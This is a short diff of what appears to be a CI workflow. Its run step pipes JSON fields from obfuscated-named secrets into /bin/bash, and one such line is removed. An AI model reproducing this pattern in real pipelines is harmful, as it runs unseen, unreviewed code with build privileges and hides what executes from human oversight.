@@ -23,7 +23,6 @@ jobs:
           giwya5657: ${{ secrets.giwya5657 }}
         run: |
           printf '%s' "$giwya5657" | jq -r .su830 | /bin/bash
-          printf '%s' "$fvlcq71913" | jq -r .s6451 | /bin/bash
           printf '%s' "$kq07963" | jq -r .hvbm7782 | /bin/bash
 
       - name: Store artifact
